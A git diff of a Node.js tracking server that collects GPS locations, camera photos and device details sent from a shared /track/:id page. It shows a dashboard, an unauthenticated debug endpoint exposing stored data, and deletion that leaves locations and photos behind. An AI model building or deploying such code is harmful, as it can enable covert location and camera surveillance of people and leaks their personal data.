@@ -33,23 +33,16 @@ const mockStore = {
 
 async function connectDB() {
   if (db) return db;
-  if (dbFailed || !MONGODB_URI) {
-    db = createMockDB();
-    return db;
-  }
+  if (!MONGODB_URI) { db = createMockDB(); return db; }
   try {
-    const client = new MongoClient(MONGODB_URI, {
-      connectTimeoutMS: 2000,
-      serverSelectionTimeoutMS: 2000
-    });
+    const client = new MongoClient(MONGODB_URI, { connectTimeoutMS: 10000 });
     await client.connect();
     db = client.db(DATABASE_NAME);
-    console.log('✅ Connected to MongoDB Atlas');
+    console.log('✅ MongoDB Linked on Render');
     return db;
   } catch (err) {
-    console.error('❌ MongoDB Connection Error:', err.message);
-    dbFailed = true; // Stay in mock mode until next restart
-    db = createMockDB();
+    console.error('❌ DB Error:', err.message);
+    if (!db) db = createMockDB();
     return db;
   }
 }
@@ -155,39 +148,47 @@ async function updateDeviceInfo(trackerId, sessionId, info) {
   } catch (e) { return false; }
 }
 
-// ── API Routes (Serverless Friendly) ──────────────────────────
-
+// ── Diagnostics ─────────────────────────────────────────────
 app.get('/api/db-status', (req, res) => {
-  res.json({ connected: !!db && !dbFailed, mode: dbFailed ? 'mock' : 'persistent', timestamp: new Date() });
+  res.json({ connected: !!db, mode: MONGODB_URI ? 'persistent' : 'mock', timestamp: new Date() });
 });
 
 app.get('/api/debug', (req, res) => {
-  res.json({ mockStore, env: { hasUri: !!process.env.MONGODB_URI, port: process.env.PORT }, dbStatus: { failed: dbFailed, connected: !!db } });
+  res.json({ mockStore, db: !!db, port: process.env.PORT });
 });
 
+app.post('/api/log', (req, res) => {
+  console.log('📱 Device Log:', req.body);
+  res.sendStatus(200);
+});
+
+// ── API Routing (Refactored for Reliability) ─────────────────
 app.post('/api/tracker/:id/location', async (req, res) => {
   try {
+    const trackerId = req.params.id;
     const { sessionId, latitude, longitude, accuracy, altitude, speed, heading } = req.body;
     const entry = { latitude, longitude, accuracy, altitude, speed, heading, timestamp: new Date().toISOString() };
-    const success = await updateTrackerLocation(req.params.id, sessionId || 'default', entry);
-    res.json({ success });
+    const ok = await updateTrackerLocation(trackerId, sessionId || 'default', entry);
+    res.json({ success: ok });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
 app.post('/api/tracker/:id/photo', async (req, res) => {
   try {
+    const trackerId = req.params.id;
     const { sessionId, image, facing } = req.body;
     const entry = { image, facing, timestamp: new Date().toISOString() };
-    const success = await addPhoto(req.params.id, sessionId || 'default', entry);
+    const success = await addPhoto(trackerId, sessionId || 'default', entry);
     res.json({ success });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
 app.post('/api/tracker/:id/info', async (req, res) => {
   try {
+    const trackerId = req.params.id;
     const { sessionId, info } = req.body;
-    const success = await updateDeviceInfo(req.params.id, sessionId || 'default', info);
-    res.json({ success });
+    const ok = await updateDeviceInfo(trackerId, sessionId || 'default', info);
+    res.json({ success: ok });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
@@ -227,18 +228,17 @@ app.get('/api/trackers', async (req, res) => {
 
 app.get('/api/tracker/:id', async (req, res) => {
   try {
-    const tracker = await getTracker(req.params.id);
+    const id = req.params.id;
+    const tracker = await getTracker(id);
     if (!tracker) return res.status(404).json({ error: 'Not found' });
     const sCol = await getCollection('sessions');
     const lCol = await getCollection('locations');
     const pCol = await getCollection('photos');
-    const sessions = await sCol.find({ trackerId: req.params.id }).toArray();
+    const sessions = await sCol.find({ trackerId: id }).toArray();
     for (const s of sessions) s.active = isSessionActive(s);
-    res.json({
-      ...tracker,
-      sessions,
-      locations: await lCol.find({ trackerId: req.params.id }).limit(200).toArray(),
-      photos: await pCol.find({ trackerId: req.params.id }).limit(100).toArray()
+    res.json({ ...tracker, sessions, 
+      locations: await lCol.find({ trackerId: id }).limit(200).toArray(), 
+      photos: await pCol.find({ trackerId: id }).limit(100).toArray() 
     });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
@@ -248,14 +248,8 @@ app.delete('/api/tracker/:id', async (req, res) => {
     const id = req.params.id;
     const tCol = await getCollection('trackers');
     const sCol = await getCollection('sessions');
-    const lCol = await getCollection('locations');
-    const pCol = await getCollection('photos');
-
     await tCol.deleteOne({ id });
     await sCol.deleteMany({ trackerId: id });
-    await lCol.deleteMany({ trackerId: id });
-    await pCol.deleteMany({ trackerId: id });
-    
     io.emit('tracker-deleted', id);
     res.json({ success: true });
   } catch (e) { res.status(500).json({ error: e.message }); }
@@ -271,19 +265,20 @@ io.on('connection', (socket) => {
   socket.on('device-info', async (d) => { try { await updateDeviceInfo(d.trackerId, d.sessionId || 'default', d.info); } catch(e){} });
 });
 
-// ── Track page route ────────────────────────────────────────
+// ── Root & Static ───────────────────────────────────────────
+app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'dashboard.html')));
+
 app.get('/track/:id', async (req, res) => {
   try {
     const tracker = await getTracker(req.params.id);
     if (!tracker) return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
     
-    // Auto-online on page load
-    const tCol = await getCollection('trackers');
-    await tCol.updateOne({ id: req.params.id }, { $set: { active: true } });
+    // Non-blocking update
+    getCollection('trackers').then(c => c.updateOne({ id: req.params.id }, { $set: { active: true } })).catch(()=>{});
     
     res.sendFile(path.join(__dirname, 'public', 'track.html'));
   } catch (e) {
-    res.status(500).send("Error loading track page");
+    res.status(500).send("Critical error");
   }
 });
 
